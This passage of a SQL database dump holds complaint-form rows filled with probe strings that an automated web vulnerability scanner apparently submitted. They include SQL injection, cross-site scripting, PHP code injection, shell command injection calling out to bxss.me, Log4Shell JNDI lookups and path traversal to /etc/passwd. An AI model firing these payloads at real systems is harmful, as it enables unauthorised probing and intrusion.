10:38:15','2022-08-11 10:38:15','sample@email.tst'),(78,'\";print(md5(31337));$a=\"','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(79,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\".gethostbyname(lc(\"hittc\".\"zbhcldlh725f1.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(114).chr(74).chr(116).chr(72).\"','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(80,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(81,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\"+\"A\".concat(70-3).concat(22*4).concat(116).concat(69).concat(113).concat(89)+(require\"socket\"\nSocket.gethostbyname(\"hithq\"+\"kwusrmah578e9.bxss.me.\")[3].to_s)+\"','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(82,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','${j${::-n}di:dns${::-:}//hitntlhxpiaiz51e3a${::-.}bxss.me}zzzz','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(83,'ncMUFCMU','','','','','1',NULL,'\'\"','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(84,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\"+response.write(9733618*9004926)+\"','555','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(85,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','complaints','','','0000-00-00',0,'2022-08-11 10:38:16','2022-08-11 10:38:16','sample@email.tst'),(86,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','HttP://bxss.me/t/xss.html?%00','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(87,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','bxss.me','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(88,'ncMUFCMU','','','','','1',NULL,'1TTi46z4O','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(89,'ncMUFCMU','','','','','1',NULL,'^(#$!@#$)(()))******','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(90,'(nslookup hityuevgabkpk7b71e.bxss.me||perl -e \"gethostbyname(\'hityuevgabkpk7b71e.bxss.me\')\")','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(91,'${@print(md5(31337))}','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(92,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','../555','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(93,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\'+\'A\'.concat(70-3).concat(22*4).concat(105).concat(79).concat(115).concat(65)+(require\'socket\'\nSocket.gethostbyname(\'hitvd\'+\'wrgnuqvp69c2a.bxss.me.\')[3].to_s)+\'','','','0000-00-00',0,'2022-08-11 10:38:17','2022-08-11 10:38:17','sample@email.tst'),(94,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(95,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','bxss.me/t/xss.html?%00','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(96,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','complaints/.','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(97,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1bMnkAK6O','555','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(98,'ncMUFCMU','','','','','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(99,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,')','555','','','0000-00-00',0,'2022-08-11 10:38:18','2022-08-11 10:38:18','sample@email.tst'),(100,'$(nslookup hitayobrqrjhj26e26.bxss.me||perl -e \"gethostbyname(\'hitayobrqrjhj26e26.bxss.me\')\")','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(101,'${@print(md5(31337))}\\','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(102,'ncMUFCMU','','','','','\"+\"A\".concat(70-3).concat(22*4).concat(106).concat(83).concat(119).concat(83)+(require\"socket\"\nSocket.gethostbyname(\"hityj\"+\"tiivungxcb6bb.bxss.me.\")[3].to_s)+\"',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(103,'ncMUFCMU','','','','','HttP://bxss.me/t/xss.html?%00',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(104,'ncMUFCMU','','','','','complaints',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(105,'ncMUFCMU','','','','','1some_inexistent_file_with_long_name\0.jpg',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:19','2022-08-11 10:38:19','sample@email.tst'),(106,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'!(()&&!|*|*|','555','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(107,'\'.print(md5(31337)).\'','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(108,'ncMUFCMU','','','','','\'+\'A\'.concat(70-3).concat(22*4).concat(99).concat(81).concat(104).concat(67)+(require\'socket\'\nSocket.gethostbyname(\'hitsd\'+\'dpuqeuxr6143b.bxss.me.\')[3].to_s)+\'',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(109,'|(nslookup hitmmfrehfrbge9c7c.bxss.me||perl -e \"gethostbyname(\'hitmmfrehfrbge9c7c.bxss.me\')\")','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(110,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3736..1b7ec${::-.}1${::-.}bxss.me}}','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(111,'ncMUFCMU','','','','','bxss.me/t/xss.html?%00',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:20','2022-08-11 10:38:20','sample@email.tst'),(112,'ncMUFCMU','','','','','complaints',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(113,'ncMUFCMU','','','','','Http://bxss.me/t/fit.txt',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(114,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'^(#$!@#$)(()))******','555','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(115,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1',';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(116,'`(nslookup hitbqurkqtqah6cd4a.bxss.me||perl -e \"gethostbyname(\'hitbqurkqtqah6cd4a.bxss.me\')\")`','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(117,'ncMUFCMU','','','','','${j${::-n}di:dns${::-:}//hitjqvrarxlmpe571a${::-.}bxss.me}zzzz',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:21','2022-08-11 10:38:21','sample@email.tst'),(118,'ncMUFCMU','','','','','1',NULL,'bxss.me/t/xss.html?%00','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:22','2022-08-11 10:38:22','sample@email.tst'),(119,'\'\"()&%<acx><ScRiPt >bc6k(9625)</ScRiPt>','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:22','2022-08-11 10:38:22','sample@email.tst'),(120,'ncMUFCMU','','','','','http://bxss.me/t/fit.txt?.jpg',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:22','2022-08-11 10:38:22','sample@email.tst'),(121,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\"+\"A\".concat(70-3).concat(22*4).concat(111).concat(75).concat(111).concat(69)+(require\"socket\"\nSocket.gethostbyname(\"hitdr\"+\"tqzpgshu06293.bxss.me.\")[3].to_s)+\"','555','','','0000-00-00',0,'2022-08-11 10:38:22','2022-08-11 10:38:22','sample@email.tst'),(122,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'HttP://bxss.me/t/xss.html?%00','555','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(123,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','echo kopxlw$()\\ yzxjzo\\nz^xyu||a #\' &echo kopxlw$()\\ yzxjzo\\nz^xyu||a #|\" &echo kopxlw$()\\ yzxjzo\\nz^xyu||a #','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(124,'ncMUFCMU','','','','','1',NULL,'<!--','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(125,'ncMUFCMU','','','','','bxss.me',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(126,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'+\'A\'.concat(70-3).concat(22*4).concat(109).concat(90).concat(119).concat(81)+(require\'socket\'\nSocket.gethostbyname(\'hitjo\'+\'uylmhvfeb7d91.bxss.me.\')[3].to_s)+\'','555','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(127,'ncMUFCMU9281354','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:23','2022-08-11 10:38:23','sample@email.tst'),(128,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'12345\'\"\\\'\\\");|]*\0{\r\n<\0>','555','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(129,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'bxss.me/t/xss.html?%00','555','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(130,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'\"','555','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(131,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','&echo fnwusv$()\\ mbuagk\\nz^xyu||a #\' &echo fnwusv$()\\ mbuagk\\nz^xyu||a #|\" &echo fnwusv$()\\ mbuagk\\nz^xyu||a #','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(132,'ncMUFCMU','','','','','1',NULL,'Http://bxss.me/t/fit.txt','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(133,'ncMUFCMU','','','','','../../../../../../../../../../../../../../etc/passwd',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(134,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555\'\"()&%<acx><ScRiPt >bc6k(9355)</ScRiPt>','','','0000-00-00',0,'2022-08-11 10:38:24','2022-08-11 10:38:24','sample@email.tst'),(135,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'<!--','555','','','0000-00-00',0,'2022-08-11 10:38:25','2022-08-11 10:38:25','sample@email.tst'),(136,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','|echo tiltbj$()\\ mgnjno\\nz^xyu||a #\' |echo tiltbj$()\\ mgnjno\\nz^xyu||a #|\" |echo tiltbj$()\\ mgnjno\\nz^xyu||a #','','','0000-00-00',0,'2022-08-11 10:38:25','2022-08-11 10:38:25','sample@email.tst'),(137,'ncMUFCMU','','','','','../../../../../../../../../../../../../../windows/win.ini',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:25','2022-08-11 10:38:25','sample@email.tst'),(138,'ncMUFCMU','','','','','1',NULL,'bxss.me','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:25','2022-08-11 10:38:25','sample@email.tst'),(139,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\'\"()&%<acx><ScRiPt >bc6k(9735)</ScRiPt>','','','0000-00-00',0,'2022-08-11 10:38:25','2022-08-11 10:38:25','sample@email.tst'),(140,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','(nslookup hitbxzimzmyrv59283.bxss.me||perl -e \"gethostbyname(\'hitbxzimzmyrv59283.bxss.me\')\")','','','0000-00-00',0,'2022-08-11 10:38:26','2022-08-11 10:38:26','sample@email.tst'),(141,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:26','2022-08-11 10:38:26','sample@email.tst'),(142,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','555','','','0000-00-00',0,'2022-08-11 10:38:26','2022-08-11 10:38:26','sample@email.tst'),(143,'ncMUFCMU','','','','','complaints/.',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(144,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','5559547953','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(145,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(146,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\';print(md5(31337));$a=\'','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(147,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1some_inexistent_file_with_long_name\0.jpg','555','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(148,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','$(nslookup hittfltqzazpy69698.bxss.me||perl -e \"gethostbyname(\'hittfltqzazpy69698.bxss.me\')\")','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(149,'ncMUFCMU','','','','','../1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:27','2022-08-11 10:38:27','sample@email.tst'),(150,'ncMUFCMU','','','','','1',NULL,'complaints','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(151,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(152,'ncMUFCMU','','','','','1\'\"()&%<acx><ScRiPt >bc6k(9477)</ScRiPt>',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(153,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','&(nslookup hitwsufvsdowxea134.bxss.me||perl -e \"gethostbyname(\'hitwsufvsdowxea134.bxss.me\')\")&\'\\\"`0&(nslookup hitwsufvsdowxea134.bxss.me||perl -e \"gethostbyname(\'hitwsufvsdowxea134.bxss.me\')\")&`\'','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(154,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'Http://bxss.me/t/fit.txt','555','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(155,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\";print(md5(31337));$a=\"','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(156,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:28','2022-08-11 10:38:28','sample@email.tst'),(157,'ncMUFCMU','','','','','1',NULL,'complaints','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(158,'ncMUFCMU','','','','','\'\"()&%<acx><ScRiPt >bc6k(9822)</ScRiPt>',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(159,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'http://bxss.me/t/fit.txt?.jpg','555','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(160,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','|(nslookup hitmvhognoepk3d55b.bxss.me||perl -e \"gethostbyname(\'hitmvhognoepk3d55b.bxss.me\')\")','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(161,'ncMUFCMU','','','','','${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3960..1b7ec${::-.}1${::-.}bxss.me}}',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(162,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','${@print(md5(31337))}','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(163,'ncMUFCMU','','','','','1',NULL,'../555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:29','2022-08-11 10:38:29','sample@email.tst'),(164,'ncMUFCMU','','','','','1',NULL,'complaints/.','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(165,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','${@print(md5(31337))}\\','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(166,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'bxss.me','555','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(167,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','`(nslookup hitgpjpmlknrmc4e54.bxss.me||perl -e \"gethostbyname(\'hitgpjpmlknrmc4e54.bxss.me\')\")`','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(168,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'../../../../../../../../../../../../../../etc/passwd','555','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(169,'ncMUFCMU','','','','','19381628',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:30','2022-08-11 10:38:30','sample@email.tst'),(170,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'complaints','555','','','0000-00-00',0,'2022-08-11 10:38:31','2022-08-11 10:38:31','sample@email.tst'),(171,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:31','2022-08-11 10:38:31','sample@email.tst'),(172,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\'.print(md5(31337)).\'','','','0000-00-00',0,'2022-08-11 10:38:31','2022-08-11 10:38:31','sample@email.tst'),(173,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'../../../../../../../../../../../../../../windows/win.ini','555','','','0000-00-00',0,'2022-08-11 10:38:31','2022-08-11 10:38:31','sample@email.tst'),(174,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1',';(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")|(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")&(nslookup hitxmjngbhobj05e0d.bxss.me||perl -e \"gethostbyname(\'hitxmjngbhobj05e0d.bxss.me\')\")','','','0000-00-00',0,'2022-08-11 10:38:31','2022-08-11 10:38:31','sample@email.tst'),(175,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'complaints','555','','','0000-00-00',0,'2022-08-11 10:38:32','2022-08-11 10:38:32','sample@email.tst'),(176,'ncMUFCMU','','','','',';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:32','2022-08-11 10:38:32','sample@email.tst'),(177,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:32','2022-08-11 10:38:32','sample@email.tst'),(178,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:32','2022-08-11 10:38:32','sample@email.tst'),(179,'ncMUFCMU','','','','','echo uxdxit$()\\ eshcpi\\nz^xyu||a #\' &echo uxdxit$()\\ eshcpi\\nz^xyu||a #|\" &echo uxdxit$()\\ eshcpi\\nz^xyu||a #',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:32','2022-08-11 10:38:32','sample@email.tst'),(180,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'complaints/.','555','','','0000-00-00',0,'2022-08-11 10:38:33','2022-08-11 10:38:33','sample@email.tst'),(181,'ncMUFCMU','','','','','\';print(md5(31337));$a=\'',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:33','2022-08-11 10:38:33','sample@email.tst'),(182,'dZcStdMA','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:33','2022-08-11 10:38:33','sample@email.tst'),(183,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'../1','555','','','0000-00-00',0,'2022-08-11 10:38:33','2022-08-11 10:38:33','sample@email.tst'),(184,'ncMUFCMU','','','','','&echo idpkbw$()\\ hvyhni\\nz^xyu||a #\' &echo idpkbw$()\\ hvyhni\\nz^xyu||a #|\" &echo idpkbw$()\\ hvyhni\\nz^xyu||a #',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:33','2022-08-11 10:38:33','sample@email.tst'),(185,'ncMUFCMU','','','','','\";print(md5(31337));$a=\"',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:34','2022-08-11 10:38:34','sample@email.tst'),(186,'ncMUFCMU','','','','','1',NULL,'555-666-06069118593','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:34','2022-08-11 10:38:34','sample@email.tst'),(187,'-1 OR 2+618-618-1=0+0+0+1 --','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:34','2022-08-11 10:38:34','sample@email.tst'),(188,'ncMUFCMU','','','','','|echo xuavry$()\\ ptqzke\\nz^xyu||a #\' |echo xuavry$()\\ ptqzke\\nz^xyu||a #|\" |echo xuavry$()\\ ptqzke\\nz^xyu||a #',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:35','2022-08-11 10:38:35','sample@email.tst'),(189,'ncMUFCMU','','','','','${@print(md5(31337))}',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:35','2022-08-11 10:38:35','sample@email.tst'),(190,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'${j${::-n}di:dns${::-:}//hitgnhkcirimeb497d${::-.}bxss.me}zzzz','555','','','0000-00-00',0,'2022-08-11 10:38:35','2022-08-11 10:38:35','sample@email.tst'),(191,'-1 OR 2+740-740-1=0+0+0+1','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:35','2022-08-11 10:38:35','sample@email.tst'),(192,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1\'\"()&%<acx><ScRiPt >bc6k(9866)</ScRiPt>','555','','','0000-00-00',0,'2022-08-11 10:38:36','2022-08-11 10:38:36','sample@email.tst'),(193,'ncMUFCMU','','','','','(nslookup hitnyrijrbbim34c3f.bxss.me||perl -e \"gethostbyname(\'hitnyrijrbbim34c3f.bxss.me\')\")',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:36','2022-08-11 10:38:36','sample@email.tst'),(194,'ncMUFCMU','','','','','${@print(md5(31337))}\\',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:36','2022-08-11 10:38:36','sample@email.tst'),(195,'-1\' OR 2+402-402-1=0+0+0+1 --','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:36','2022-08-11 10:38:36','sample@email.tst'),(196,'ncMUFCMU','','','','','$(nslookup hitnmupmvwagn054b6.bxss.me||perl -e \"gethostbyname(\'hitnmupmvwagn054b6.bxss.me\')\")',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:37','2022-08-11 10:38:37','sample@email.tst'),(197,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'\"()&%<acx><ScRiPt >bc6k(9320)</ScRiPt>','555','','','0000-00-00',0,'2022-08-11 10:38:37','2022-08-11 10:38:37','sample@email.tst'),(198,'ncMUFCMU','','','','','\'.print(md5(31337)).\'',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:37','2022-08-11 10:38:37','sample@email.tst'),(199,'-1\' OR 2+715-715-1=0+0+0+1 or \'3u8sMsUe\'=\'','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:37','2022-08-11 10:38:37','sample@email.tst'),(200,'ncMUFCMU','','','','','|(nslookup hituywfpdgcmnd52f4.bxss.me||perl -e \"gethostbyname(\'hituywfpdgcmnd52f4.bxss.me\')\")',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:38','2022-08-11 10:38:38','sample@email.tst'),(201,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'19683752','555','','','0000-00-00',0,'2022-08-11 10:38:38','2022-08-11 